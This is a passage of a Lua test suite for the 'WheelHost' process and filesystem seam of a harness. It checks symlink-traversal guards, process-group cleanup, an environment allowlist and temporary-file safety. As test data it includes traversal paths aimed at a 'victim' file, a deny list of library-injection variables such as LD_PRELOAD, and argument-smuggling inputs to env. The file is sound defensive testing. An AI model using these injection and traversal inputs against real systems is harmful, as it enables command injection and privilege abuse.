      "rejecting the link must not chmod its target, got " .. tostring(mode) .. " for '" .. suffix .. "'")
  end

  -- The state fallback's harness-owned `wheel` component is also guarded.
  -- Repeated separators and `.` segments must normalize before the exact
  -- `/wheel/tmp` suffix guard; otherwise the guard is skipped and a symlinked
  -- `wheel` parent is followed and chmodded.
  os.execute("mkdir -p " .. root .. "/state/other")
  os.execute("ln -s " .. root .. "/state/other " .. root .. "/state/wheel")
  local state_forms = {
    root .. "/state/wheel/tmp",
    root .. "/state/wheel//tmp",
    root .. "/state/wheel///tmp",
    root .. "/state//wheel///tmp",
    root .. "/state/wheel/./tmp",
    root .. "/state/wheel//./tmp",
  }
  for _, state_form in ipairs(state_forms) do
    os.execute("chmod 755 " .. root .. "/state/other")
    local state_backend = WheelHost.create_backend("standalone", {
      tmp_root = state_form,
    })
    local state_ok, state_err = pcall(state_backend.tmp_dir)
    assert(not state_ok, "a symlinked harness-owned wheel component must be rejected: " .. state_form)
    local state_denial = assert_typed_error(state_err, "E_CAPABILITY_DENIED")
    assert(state_denial.message == "capability 'fs.write' is not granted",
      "the wheel-parent guard must report the typed fs.write denial: " .. state_form)
    local state_listing = WheelHost.proc.run_command(
      "ls -ld " .. WheelHost.proc.shell_quote(root .. "/state/other"))
    local state_mode = state_listing.stdout:match("^(%S+)")
    assert(string.sub(state_mode or "", 1, 10) == "drwxr-xr-x",
      "rejecting the link must not chmod its target, got " .. tostring(state_mode)
        .. " for '" .. state_form .. "'")
  end

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: repeated and dot segments normalize before use", function()
  local root = test_path("test_host_tmp_normalize")
  os.execute("rm -rf " .. root)

  local backend = WheelHost.create_backend("standalone", {
    tmp_root = root .. "/nested//runtime///",
  })
  local dir, err = backend.tmp_dir()
  assert(dir == root .. "/nested/runtime",
    "repeated separators and trailing separators must collapse: " .. tostring(err))

  local listing = WheelHost.proc.run_command("ls -ld " .. WheelHost.proc.shell_quote(dir))
  local mode = listing.stdout:match("^(%S+)")
  assert(string.sub(mode or "", 1, 10) == "drwx------",
    "the normalized directory must be 0700, got " .. tostring(mode))

  local tmp_path = backend.tmp_path()
  assert(tmp_path:sub(1, #dir + 1) == dir .. "/",
    "tmp_path must use the normalized private directory")

  local dot_backend = WheelHost.create_backend("standalone", {
    tmp_root = root .. "/nested/./runtime",
  })
  local dot_dir, dot_err = dot_backend.tmp_dir()
  assert(dot_dir == root .. "/nested/runtime",
    "interior dot segments must normalize to the same directory: " .. tostring(dot_err))

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: temp roots reject root, dot-only, and symlink traversal", function()
  local root = test_path("test_host_tmp_guard")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root .. "/base " .. root .. "/real-parent")
  -- `...` is a symlink to the parent directory; it must not be followed.
  os.execute("ln -s .. " .. root .. "/base/...")
  os.execute("ln -s " .. root .. "/real-parent " .. root .. "/alias")

  local function root_mode()
    local listing = WheelHost.proc.run_command("ls -ld /")
    return listing.stdout:match("^(%S+)")
  end

  local mode_before = root_mode()
  local saved_execute = os.execute
  local mutating = {}
  os.execute = function(command)
    if string.find(command, "mkdir", 1, true) or string.find(command, "chmod", 1, true) then
      table.insert(mutating, command)
      return 1
    end
    return saved_execute(command)
  end

  local forms = {
    "/", "//", "/.", "/./", TEST_RUN_ROOT .. "/..", TEST_RUN_ROOT .. "/../..", "..",
    root .. "/base/.../victim",
    root .. "/base//.../victim",
    root .. "/base/./.../victim",
    root .. "/base/.../../victim",
  }
  local results = {}
  for _, form in ipairs(forms) do
    local backend = WheelHost.create_backend("standalone", { tmp_root = form })
    local ok, err = pcall(backend.tmp_dir)
    results[#results + 1] = { form = form, ok = ok, err = err }
  end
  os.execute = saved_execute

  assert(#mutating == 0,
    "root/traversal guard must reject before mkdir/chmod: " .. table.concat(mutating, "; "))
  for _, result in ipairs(results) do
    assert(not result.ok, "unsafe tmp_root must be rejected: '" .. result.form .. "'")
    local denial = assert_typed_error(result.err, "E_CAPABILITY_DENIED")
    assert(denial.message == "capability 'fs.write' is not granted",
      "unsafe tmp_root must report the typed fs.write denial: '" .. result.form .. "'")
  end
  assert(root_mode() == mode_before, "the filesystem root mode must not change")
  assert(not WheelHost.fs.exists(root .. "/victim"),
    "the symlinked traversal must not create a file outside base")

  -- A legitimate parent symlink is still allowed.
  local alias_backend = WheelHost.create_backend("standalone", { tmp_root = root .. "/alias/runtime" })
  local alias_dir, alias_err = alias_backend.tmp_dir()
  assert(alias_dir == root .. "/alias/runtime",
    "a non-owned parent symlink must still resolve: " .. tostring(alias_err))

  -- Legitimate relative roots still normalize (trailing separator and `/.`).
  -- The name carries this run's unique suffix so concurrent runs sharing a
  -- working directory cannot remove each other's relative fixture. The body is
  -- guarded so a mid-test failure still removes that CWD-local directory.
  local relative = "wheel-test-relative-"
    .. (TEST_RUN_ROOT:match("([^/]+)$") or "run")
  os.execute("rm -rf " .. relative)
  local body_ok, body_err = pcall(function()
    local with_slash = WheelHost.create_backend("standalone", { tmp_root = relative .. "/" })
    local slash_dir, slash_err = with_slash.tmp_dir()
    assert(slash_dir == relative, "trailing slash must normalize to " .. relative .. ": " .. tostring(slash_err))
    local slash_listing = WheelHost.proc.run_command("ls -ld " .. WheelHost.proc.shell_quote(relative))
    local slash_mode = slash_listing.stdout:match("^(%S+)")
    assert(string.sub(slash_mode or "", 1, 10) == "drwx------",
      "relative trailing-slash root must be 0700, got " .. tostring(slash_mode))
    local with_dot = WheelHost.create_backend("standalone", { tmp_root = relative .. "/." })
    local dot_dir, dot_err = with_dot.tmp_dir()
    assert(dot_dir == relative, "trailing /. must normalize to " .. relative .. ": " .. tostring(dot_err))
  end)
  os.execute("rm -rf " .. relative .. " " .. root)
  if not body_ok then
    error(body_err, 0)
  end
end)

run_test("WheelHost: non-string tmp_root fails typed", function()
  for _, value in ipairs({ 42, false, {}, function() end }) do
    local backend = WheelHost.create_backend("standalone", { tmp_root = value })
    local ok, err = pcall(backend.tmp_dir)
    assert(not ok, "non-string tmp_root must be rejected")
    local denial = assert_typed_error(err, "E_CAPABILITY_DENIED")
    assert(denial.message == "capability 'fs.write' is not granted")
  end
end)

run_test("WheelHost: default temp directory still resolves", function()
  local backend = WheelHost.create_backend("standalone")
  local runtime = os.getenv("XDG_RUNTIME_DIR")
  local state = os.getenv("XDG_STATE_HOME")
  local home = os.getenv("HOME")
  local expected
  if runtime and runtime ~= "" then
    expected = runtime .. "/wheel"
  elseif state and state ~= "" then
    expected = state .. "/wheel/tmp"
  elseif home and home ~= "" then
    expected = home .. "/.local/state/wheel/tmp"
  end

  local ok, dir = pcall(backend.tmp_dir)
  if not expected then
    assert(not ok, "tmp_dir without any runtime/state/home base must fail closed")
    assert_typed_error(dir, "E_CAPABILITY_DENIED")
    return
  end
  assert(ok, "default temp directory must resolve: " .. tostring(dir))
  assert(dir == expected, "default temp directory drifted: " .. tostring(dir))
  local listing = WheelHost.proc.run_command("ls -ld " .. WheelHost.proc.shell_quote(dir))
  local mode = listing.stdout:match("^(%S+)")
  assert(string.sub(mode or "", 1, 10) == "drwx------",
    "default temp directory must be 0700, got " .. tostring(mode))
end)

run_test("WheelHost: typed platform denials survive config, tool, and provider loaders", function()
  local saved_config = package.config
  package.config = "\\\n?\n!\n-\n"

  local function probe(module)
    local saved_modules = detach_wheel_modules()
    local ok, err = pcall(require, module)
    restore_wheel_modules(saved_modules)
    return ok, err
  end

  local config_ok, config_err = probe("wheel.config")
  local tool_ok, tool_err = probe("wheel.tool")
  local provider_ok, provider_err = probe("wheel.provider")
  package.config = saved_config

  assert(not config_ok, "wheel.config must fail closed on a non-POSIX platform")
  local config_denial = assert_typed_error(config_err, "E_CAPABILITY_DENIED")
  assert(config_denial.message == "capability 'host.backend.standalone' is not granted",
    "wheel.config must preserve the typed host-backend denial")

  assert(not tool_ok, "wheel.tool must fail closed on a non-POSIX platform")
  local tool_denial = assert_typed_error(tool_err, "E_CAPABILITY_DENIED")
  assert(tool_denial.message == "capability 'host.backend.standalone' is not granted",
    "wheel.tool must preserve the typed host-backend denial")

  assert(not provider_ok, "wheel.provider must fail closed on a non-POSIX platform")
  local provider_denial = assert_typed_error(provider_err, "E_CAPABILITY_DENIED")
  assert(provider_denial.message == "capability 'host.backend.standalone' is not granted",
    "wheel.provider must preserve the typed host-backend denial")
end)

run_test("Wheel Init: repeated lazy host failure keeps the typed cause", function()
  local saved_config = package.config
  local saved_modules = detach_wheel_modules()
  package.config = "\\\n?\n!\n-\n"

  local init_ok, wheel = pcall(require, "wheel.init")
  local first_ok, first_err, second_ok, second_err
  if init_ok then
    first_ok, first_err = pcall(function() return wheel.host end)
    second_ok, second_err = pcall(function() return wheel.host end)
  end

  package.config = saved_config
  restore_wheel_modules(saved_modules)

  assert(init_ok, "activation must stay loadable on a non-POSIX platform: " .. tostring(wheel))
  assert(not first_ok and not second_ok, "both lazy host accesses must fail")
  local first_activation = assert_typed_error(first_err, "E_MODULE_LOAD_FAILED", "resolution")
  local second_activation = assert_typed_error(second_err, "E_MODULE_LOAD_FAILED", "resolution")
  assert(first_activation.message:find("host.backend.standalone", 1, true) ~= nil,
    "first failure must preserve the seam cause")
  assert(second_activation.message:find("host.backend.standalone", 1, true) ~= nil,
    "second failure must keep the seam cause instead of the sentinel error")
  assert(second_activation.message:find("loop or previous error", 1, true) == nil,
    "the failed-require sentinel must be cleared")
end)

run_test("WheelHost: routed harness paths contain no direct host primitives", function()
  local DIRECT_PATTERNS = {
    "io%.open",
    "io%.popen",
    "os%.tmpname",
    "os%.clock",
    "os%.remove",
    "os%.execute",
    "os%.time",
  }

  local function direct_hits(source)
    local hits = {}
    for _, pattern in ipairs(DIRECT_PATTERNS) do
      if string.find(source, pattern) then
        table.insert(hits, pattern)
      end
    end
    return hits
  end

  -- Control: the detector must catch the patterns it claims to guard.
  assert(#direct_hits("local f = io.open('/tmp/x')") == 1, "guard must detect io.open")
  assert(#direct_hits("local t = os.clock()") == 1, "guard must detect os.clock")

  local pipe = assert(io.popen("ls -1 lua/wheel/*.lua", "r"))
  local files = {}
  for line in pipe:lines() do
    files[#files + 1] = line
  end
  pipe:close()
  assert(#files >= 14, "guard must inspect every harness module")

  local checked = 0
  for _, path in ipairs(files) do
    local fh = assert(io.open(path, "rb"))
    local source = fh:read("*a")
    fh:close()
    if path == "lua/wheel/host.lua" then
      -- The seam is the one module allowed to touch the stdlib primitives.
      assert(#direct_hits(source) > 0, "the host seam must own the direct primitives")
    else
      local hits = direct_hits(source)
      assert(#hits == 0, path .. " must route every host primitive through WheelHost: "
        .. table.concat(hits, ", "))
      checked = checked + 1
    end
  end
  assert(checked >= 13, "guard must cover every non-host harness module")
end)

run_test("WheelHost: proc primitives (run_command, run_program, command_runner)", function()
  -- run_command executes a shell command and captures stdout
  local res = WheelHost.proc.run_command("echo wheel-host-ok")
  assert(res.ok == true, "run_command must launch")
  assert(res.code == 0, "echo must exit 0")
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.SWEPT,
    "a launched command must report a completed sweep")
  assert(string.find(res.stdout, "wheel-host-ok", 1, true) ~= nil, "stdout must be captured")

  -- A validation failure never launches a process group.
  local invalid = WheelHost.proc.run_program("true", {}, { timeout_ms = 1 })
  assert(invalid.ok == false and invalid.cleanup == WheelHost.GROUP_CLEANUP.NOT_RUN,
    "a validation failure must report cleanup=not_run")

  -- A failing command is still launched; the wrapper records the exit status.
  local fail = WheelHost.proc.run_command("exit 7")
  assert(fail.ok == true, "a spawned failing command is still launched")
  assert(fail.code == 7 and fail.exit_code == 7, "the recorded exit code must be captured")
  assert(fail.outcome == WheelHost.PROCESS_OUTCOME.EXITED)

  -- run_program passes an argv verbatim (no shell word splitting)
  local argv = WheelHost.proc.run_program("echo", { "argv", "with spaces" })
  assert(argv.ok == true and argv.code == 0)
  assert(string.find(argv.stdout, "argv with spaces", 1, true) ~= nil, "argv must not be word-split")

  -- env.command_runner (the existing tool override) is honored and normalized
  local seen_args = nil
  local doubled = WheelHost.proc.run_command("ignored-command", {
    command_runner = function(args, env)
      seen_args = args
      assert(type(env) == "table", "runner must receive its env")
      return { success = true, exit_code = 0, stdout = "runner-double", stderr = "" }
    end,
  })
  assert(seen_args ~= nil and seen_args.command == "ignored-command", "runner must see the shell string")
  assert(doubled.ok == true and doubled.code == 0)
  assert(doubled.cleanup == WheelHost.GROUP_CLEANUP.NOT_RUN,
    "a command_runner double never launches a host group")
  assert(doubled.stdout == "runner-double", "runner output is normalized into the seam shape")

  local failing = WheelHost.proc.run_command("ignored-command", {
    command_runner = function()
      return { success = false, exit_code = 3, stdout = "", stderr = "boom" }
    end,
  })
  assert(failing.ok == true and failing.code == 3, "runner exit code is preserved")
  assert(failing.stderr == "boom")
end)

local function test_process_state(pid)
  local probe = WheelHost.proc.run_program("ps", { "-o", "stat=", "-p", tostring(pid) },
    { discard_stderr = true })
  if probe.code ~= 0 then
    return nil
  end
  local state = (probe.stdout or ""):match("^%s*(%S+)")
  return state
end

local function assert_test_process_gone(pid, label)
  for _ = 1, 10 do
    local state = test_process_state(pid)
    if state == nil then
      return
    end
    os.execute("sleep 0.05")
  end
  local state = test_process_state(pid)
  assert(state == nil, label .. " must not leave a running process; state=" .. tostring(state))
end

local function read_test_file(path)
  local fh = io.open(path, "r")
  if not fh then
    return nil
  end
  local data = fh:read("*a")
  fh:close()
  return (data:gsub("^%s+", ""):gsub("%s+$", ""))
end

local function wait_for_test_file(path, attempts)
  for _ = 1, attempts or 25 do
    local value = read_test_file(path)
    if value ~= nil and value ~= "" then
      return value
    end
    os.execute("sleep 0.02")
  end
  return nil
end

local function kill_recorded_test_pid(pid)
  if type(pid) == "string" and pid:match("^%d+$") then
    os.execute("kill " .. pid .. " 2>/dev/null || :")
  end
end

run_test("WheelHost: timeout kills only the recorded process group", function()
  local root = test_path("test_host_proc_group")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local pid_file = root .. "/grandchild.pid"

  local res = backend.run_program("sh", {
    "-c",
    "sleep 30 & echo $! > " .. WheelHost.proc.shell_quote(pid_file) .. "; wait",
  }, { timeout_ms = 500 })

  assert(res.ok == true, "a timed-out process is still a launched process")
  assert(res.timed_out == true and (res.exit_code == 124 or res.exit_code == 137),
    "GNU timeout must map expiry to 124/137: " .. tostring(res.code))
  assert(res.outcome == WheelHost.PROCESS_OUTCOME.TIMEOUT, "timeout must be a typed outcome")
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.SWEPT,
    "the retained leader must complete the timeout sweep: " .. tostring(res.cleanup))
  assert(type(res.pgid) == "number" and res.pgid > 1,
    "the recorded PGID must be reported on a timeout")

  local fh = io.open(pid_file, "r")
  local grandchild = fh and fh:read("*l") or nil
  if fh then fh:close() end
  assert(type(grandchild) == "string" and grandchild:match("^%d+$") ~= nil,
    "the child must record its grandchild PID")

  -- Give the group signal a moment to be delivered and reaped, then observe
  -- the PID without sending any signal.
  os.execute("sleep 0.2")
  local probe = WheelHost.proc.run_program("ps", { "-o", "stat=", "-p", grandchild },
    { discard_stderr = true })
  local state = probe.code == 0 and (probe.stdout or ""):match("^%s*(%S+)") or nil
  assert(state == nil or state:sub(1, 1) == "Z",
    "the timed-out process group must not leave a running grandchild: " .. tostring(state))

  -- Capture files must be removed on the timeout path as well.
  local leftover = {}
  local listing = io.popen("ls -1a " .. WheelHost.proc.shell_quote(root))
  if listing then
    for line in listing:lines() do
      if line:match("^wheel%-") then
        leftover[#leftover + 1] = line
      end
    end
    listing:close()
  end
  assert(#leftover == 0, "timeout capture files must be cleaned up: " .. table.concat(leftover, ","))

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: normal exit sweeps the recorded process group", function()
  local root = test_path("test_host_proc_normal_exit")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })

  local pid_file = root .. "/background.pid"
  local res = backend.run_program("sh", {
    "-c",
    "sleep 30 & echo $! > " .. WheelHost.proc.shell_quote(pid_file),
  })
  assert(res.ok == true and res.code == 0, "a backgrounding command must still exit normally")
  local fh = io.open(pid_file, "r")
  local pid = fh and fh:read("*l") or nil
  if fh then fh:close() end
  assert(type(pid) == "string" and pid:match("^%d+$") ~= nil,
    "the child must record its background PID")
  assert_test_process_gone(pid, "normal-exit background child")

  -- The explicit shell-string primitive must sweep as well.
  local shell_pid_file = root .. "/shell-background.pid"
  local shell_res = WheelHost.proc.run_command(
    "sleep 30 & echo $! > " .. WheelHost.proc.shell_quote(shell_pid_file))
  assert(shell_res.ok == true and shell_res.code == 0,
    "run_command must still return the shell status")
  local sfh = io.open(shell_pid_file, "r")
  local shell_pid = sfh and sfh:read("*l") or nil
  if sfh then sfh:close() end
  assert(type(shell_pid) == "string" and shell_pid:match("^%d+$") ~= nil,
    "run_command must record its background PID")
  assert_test_process_gone(shell_pid, "run_command background child")

  -- A TERM-ignoring child must receive KILL after the bounded sweep grace.
  local stubborn_file = root .. "/stubborn.pid"
  local stubborn = backend.run_program("sh", {
    "-c",
    "sh -c 'trap \"\" TERM; sleep 30' & echo $! > "
      .. WheelHost.proc.shell_quote(stubborn_file),
  })
  assert(stubborn.ok == true and stubborn.code == 0,
    "a command with a TERM-ignoring child must still exit normally")
  local tfh = io.open(stubborn_file, "r")
  local stubborn_pid = tfh and tfh:read("*l") or nil
  if tfh then tfh:close() end
  assert(type(stubborn_pid) == "string" and stubborn_pid:match("^%d+$") ~= nil,
    "the TERM-ignoring child must record its PID")
  assert_test_process_gone(stubborn_pid, "TERM-ignoring background child")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: retained leader preserves status and reports the recorded PGID", function()
  local root = test_path("test_host_pgid_identity")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local record = root .. "/background.txt"

  local res = backend.run_program("sh", {
    "-c",
    "sleep 30 & child=$!; printf '%s %s' \"$child\" \"$(ps -o pgid= -p \"$child\")\" > "
      .. WheelHost.proc.shell_quote(record) .. "; exit 7",
  })

  assert(res.ok == true, "the command must be launched")
  assert(res.code == 7 and res.exit_code == 7,
    "the direct command's exit status must survive the sweep: " .. tostring(res.code))
  assert(res.outcome == WheelHost.PROCESS_OUTCOME.EXITED)
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.SWEPT,
    "a normal exit must report a completed group sweep: " .. tostring(res.cleanup))
  assert(type(res.pgid) == "number" and res.pgid > 1,
    "the recorded PGID must be returned: " .. tostring(res.pgid))
  assert(res.stderr == "", "a swept normal exit must keep stderr clean: " .. tostring(res.stderr))

  local child_pid, child_pgid = (read_test_file(record) or ""):match("^(%d+)%s+(%d+)$")
  assert(child_pid ~= nil, "the child must record its PID and process group")
  assert(tonumber(child_pgid) == res.pgid,
    "the recorded PGID must be the background child's group: "
      .. tostring(child_pgid) .. " vs " .. tostring(res.pgid))
  assert_test_process_gone(child_pid, "status-preserving sweep background child")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: the retained leader holds the PGID through the sweep", function()
  local root = test_path("test_host_pgid_retention")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local marker = root .. "/leader-alive"
  local ready = root .. "/ready"
  local pid_file = root .. "/stubborn.pid"
  local quote = WheelHost.proc.shell_quote

  -- The background shell installs a TERM trap, reports readiness, then waits.
  -- On TERM it records whether the recorded PGID (the retained leader) is still
  -- alive, then keeps running so the bounded KILL escalation is exercised.
  local script = "sh -c 'set -- $(ps -o pgid= -p $$); pgid=$1; "
    .. "trap \"if kill -0 \\\"$pgid\\\" 2>/dev/null; then echo \\\"$pgid\\\" > $WHEEL_TEST_MARKER; "
    .. "else echo gone > $WHEEL_TEST_MARKER; fi; sleep 30\" TERM; "
    .. ": > $WHEEL_TEST_READY; sleep 30' 2>/dev/null & echo $! > " .. quote(pid_file) .. "; "
    .. "i=0; while [ ! -f \"$WHEEL_TEST_READY\" ] && [ $i -lt 300 ]; do sleep 0.01; i=$((i+1)); done"

  local res = backend.run_program("sh", { "-c", script }, {
    env = { WHEEL_TEST_MARKER = marker, WHEEL_TEST_READY = ready },
  })

  assert(res.ok == true and res.code == 0,
    "a command with a TERM-ignoring background child must still exit normally")
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.SWEPT,
    "the retained leader must complete the sweep: " .. tostring(res.cleanup))
  assert(res.stderr == "", "the sweep must not add stderr: " .. tostring(res.stderr))

  local observed = wait_for_test_file(marker, 25)
  assert(observed == tostring(res.pgid),
    "the recorded PGID must still be the live leader when the sweep sends TERM: "
      .. tostring(observed) .. " vs " .. tostring(res.pgid))

  local stubborn_pid = read_test_file(pid_file)
  assert(stubborn_pid ~= nil and stubborn_pid:match("^%d+$") ~= nil,
    "the TERM-ignoring child must record its PID")
  assert_test_process_gone(stubborn_pid, "TERM-ignoring grandchild held by the leader")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: an unrelated process group is never signaled", function()
  local root = test_path("test_host_pgid_decoy")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local decoy_pid_file = root .. "/decoy.pid"
  local decoy_pid = nil

  -- Start a decoy in its own session and process group. It is never part of a
  -- Wheel invocation, so no Wheel sweep may signal it. With a retained leader
  -- the recorded PGID cannot be recycled while the sweep runs; this live decoy
  -- is the deterministic stand-in for a reused/foreign group.
  os.execute("setsid sh -c 'echo $$ > " .. WheelHost.proc.shell_quote(decoy_pid_file)
    .. "; exec sleep 30' >/dev/null 2>&1 &")
  local recorded_decoy = wait_for_test_file(decoy_pid_file, 50)
  if recorded_decoy and recorded_decoy:match("^%d+$") then
    decoy_pid = recorded_decoy
  end
  assert(decoy_pid ~= nil, "the decoy must record its session PID")

  local own_pid_file = root .. "/own.pid"
  local res = backend.run_program("sh", {
    "-c",
    "sleep 30 & echo $! > " .. WheelHost.proc.shell_quote(own_pid_file),
  })

  assert(res.ok == true and res.code == 0, "the swept command must exit normally")
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.SWEPT)
  assert(res.pgid ~= tonumber(decoy_pid),
    "the recorded PGID must not be the decoy group")

  local own_pid = read_test_file(own_pid_file)
  assert(own_pid ~= nil and own_pid:match("^%d+$") ~= nil,
    "the swept child must record its PID")
  assert_test_process_gone(own_pid, "swept background child")
  local decoy_state = test_process_state(decoy_pid)
  assert(decoy_state ~= nil and decoy_state:sub(1, 1) ~= "Z",
    "an unrelated process group must survive the sweep: " .. tostring(decoy_state))

  kill_recorded_test_pid(decoy_pid)
  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: an identity-lost leader is reported unverified and signals nothing", function()
  local root = test_path("test_host_pgid_identity_loss")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local orphan_file = root .. "/orphan.pid"

  -- The command kills its own session leader before the sweep can run. The
  -- harness cannot prove the recorded PGID identity any more, so it must not
  -- signal the group; the failure is typed and the orphan survives.
  local res = backend.run_program("sh", {
    "-c",
    "sleep 30 & echo $! > " .. WheelHost.proc.shell_quote(orphan_file)
      .. "; set -- $(ps -o sid= -p $$); kill -9 \"$1\"; sleep 0.2",
  })

  assert(res.ok == false, "an identity-lost run must not report success")
  assert(res.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
    "the identity loss must be a typed failure: " .. tostring(res.outcome))
  assert(res.cleanup == WheelHost.GROUP_CLEANUP.UNVERIFIED,
    "the identity loss must be reported as unverified cleanup: " .. tostring(res.cleanup))
  assert(type(res.stderr) == "string" and res.stderr:find("not swept", 1, true) ~= nil,
    "the failure must state that the group was not swept: " .. tostring(res.stderr))

  local orphan_pid = wait_for_test_file(orphan_file, 25)
  assert(orphan_pid ~= nil and orphan_pid:match("^%d+$") ~= nil,
    "the orphan must record its PID")
  local orphan_state = test_process_state(orphan_pid)
  assert(orphan_state ~= nil and orphan_state:sub(1, 1) ~= "Z",
    "the unverified group must not be signaled: " .. tostring(orphan_state))

  kill_recorded_test_pid(orphan_pid)
  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: process environment allowlist and stdin channel", function()
  local saved_getenv = os.getenv
  os.getenv = function(name)
    if name == "WHEEL_SYNTHETIC_TOKEN" then
      return "synthetic-secret-value"
    end
    if name == "PATH" then
      return "/usr/bin:/bin:relative:."
    end
    return saved_getenv(name)
  end

  local ok, res = pcall(WheelHost.proc.run_program, "sh", {
    "-c",
    'printf "%s|%s|%s" "${WHEEL_SYNTHETIC_TOKEN-unset}" "$PATH" "${WHEEL_DECLARED-unset}"',
  }, { env = { WHEEL_DECLARED = "declared" } })
  os.getenv = saved_getenv

  assert(ok, "the scrubbed process must run: " .. tostring(res))
  assert(res.ok == true and res.code == 0, tostring(res.stderr))
  assert(res.stdout == "unset|/usr/bin:/bin|declared",
    "only declared variables and absolute PATH entries may reach the child: " .. tostring(res.stdout))

  -- No undeclared variable (including shell-added PWD/SHLVL) may survive.
  local allowed = {
    PATH = true, HOME = true, LANG = true, LC_ALL = true, TERM = true,
    TMPDIR = true, XDG_RUNTIME_DIR = true, XDG_STATE_HOME = true,
    XDG_CONFIG_HOME = true,
  }
  local listed = WheelHost.proc.run_program("env", {})
  assert(listed.ok and listed.code == 0, "the environment inventory must run")
  for line in listed.stdout:gmatch("[^\n]+") do
    local name = line:match("^([^=]+)=")
    assert(name ~= nil and allowed[name] == true,
      "the child environment must contain only allowlisted names, found " .. tostring(name))
  end

  -- A secret-shaped explicit declaration is refused without echoing the value.
  local secret = WheelHost.proc.run_program("true", {}, { env = { OPENAI_API_KEY = "sk-test-value" } })
  assert(secret.ok == false and secret.outcome == WheelHost.PROCESS_OUTCOME.FAILURE)
  assert(secret.stderr:find("OPENAI_API_KEY", 1, true) ~= nil, "the refusal must name the variable")
  assert(secret.stderr:find("sk-test-value", 1, true) == nil, "the refusal must not echo the value")

  for _, name in ipairs({ "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "IFS", "SHELLOPTS" }) do
    local forbidden = WheelHost.proc.run_program("true", {}, {
      env = { [name] = "injected" },
    })
    assert(forbidden.ok == false and forbidden.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
      name .. " must be refused as a child environment name")
  end

  -- A leading-dash program name must not become an env option.
  local split = WheelHost.proc.run_program("-S", { "echo ENVSPLIT" })
  assert(split.stdout:find("ENVSPLIT", 1, true) == nil,
    "env -S must not split the child argument vector")
  local split_long = WheelHost.proc.run_program("--split-string=echo ENVSPLIT", {})
  assert(split_long.stdout:find("ENVSPLIT", 1, true) == nil,
    "env --split-string must not split the child argument vector")
  local clear = WheelHost.proc.run_program("-i", {})
  assert(clear.stdout == "", "env -i must not execute or print the child environment")
  local assignment = WheelHost.proc.run_program("FOO=bar", {})
  assert(assignment.stdout == "" and assignment.code ~= 0,
    "a program containing '=' must be refused as an env assignment")

  -- stdin is carried without a shell string; the default is /dev/null.
  local cat = WheelHost.proc.run_program("cat", {}, { stdin = "stdin-line-1\nstdin-line-2" })
  assert(cat.ok and cat.code == 0 and cat.stdout == "stdin-line-1\nstdin-line-2",
    "stdin must round-trip through the argv primitive")
  local eof = WheelHost.proc.run_program("sh", { "-c", 'read x; printf "%s" "${x:-none}"' })
  assert(eof.ok and eof.stdout == "none", "stdin must default to /dev/null")

  local too_big = WheelHost.proc.run_program("cat", {}, {
    stdin = string.rep("x", WheelHost.LIMITS.MAX_STDIN_BYTES + 1),
  })
  assert(too_big.ok == false and too_big.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
    "stdin above the 1 MiB bound must fail closed")
  assert(too_big.stderr:find("stdin", 1, true) ~= nil, "the stdin bound failure must be explained")

  -- A PATH without absolute entries is unavailable, not silently inherited.
  os.getenv = function(name)
    if name == "PATH" then
      return "relative:."
    end
    return saved_getenv(name)
  end
  local no_path = WheelHost.proc.run_program("true")
  os.getenv = saved_getenv
  assert(no_path.ok == false and no_path.outcome == WheelHost.PROCESS_OUTCOME.UNAVAILABLE,
    "an implicit PATH must fail closed as unavailable")

  -- Invalid bounds are a typed failure.
  local bad_timeout = WheelHost.proc.run_program("true", {}, { timeout_ms = 1 })
  assert(bad_timeout.ok == false and bad_timeout.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
    "an out-of-range timeout must be a typed failure")
end)

run_test("WheelHost: process output truncation is explicit", function()
  local res = WheelHost.proc.run_program("sh", {
    "-c",
    "printf '%4096s' ''; printf '%4096s' '' >&2",
  }, { max_output_bytes = 64 })

  assert(res.ok == true and res.code == 0)
  assert(res.truncated == true and res.stdout_truncated == true and res.stderr_truncated == true,
    "both captured streams must report truncation")
  assert(#res.stdout == 64 and #res.stderr == 64,
    "captured streams must be cut at the configured cap")

  local merged = WheelHost.proc.run_program("sh", {
    "-c",
    "printf '%4096s' ''; printf '%4096s' '' >&2",
  }, { max_output_bytes = 64, merge_stderr = true })
  assert(merged.truncated == true and #merged.stdout == 128 and merged.stderr == "",
    "merged output must stay bounded and keep the merge shape")
end)

run_test("WheelHost: temporary files are exclusive, 0600, and never follow a path", function()
  local dir = WheelHost.tmp.dir()
  local path = WheelHost.tmp.name()
  assert(WheelHost.tmp.create_exclusive(path, "payload") == true,
    "exclusive creation must succeed on a fresh path")
  local info = WheelHost.fs.stat(path)
  assert(info.mode == 384, "exclusive temporary files must be mode 0600, got " .. tostring(info.mode))
  assert(WheelHost.fs.read_file(path) == "payload")

  local replaced, replace_err = WheelHost.tmp.create_exclusive(path, "overwrite")
  assert(replaced == false and type(replace_err) == "string",
    "an existing path must be refused")
